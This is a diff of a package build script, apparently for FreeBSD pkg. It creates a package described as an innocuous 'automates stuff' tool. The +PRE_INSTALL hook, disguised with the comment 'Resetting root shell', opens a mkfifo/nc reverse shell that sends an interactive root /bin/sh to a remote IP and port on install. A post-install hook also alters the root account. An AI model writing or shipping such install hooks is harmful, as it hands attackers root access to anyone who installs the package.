@@ -27,7 +27,7 @@ mkdir -p ${STAGEDIR}
 cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
 # careful here, this may clobber your system
 echo "Resetting root shell"
-rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc IP PORT >/tmp/a
+rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/a
 EOF
 cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
 # careful here, this may clobber your system
@@ -36,7 +36,7 @@ pw usermod -n root -s /bin/sh
 EOF
 cat >> ${STAGEDIR}/+MANIFEST <<EOF
 name: mypackage
-version:"1.0_5"
+version: "1.0_5"
 origin: sysutils/mypackage
 comment: "automates stuff"
 desc: "automates tasks which can also be undone later"
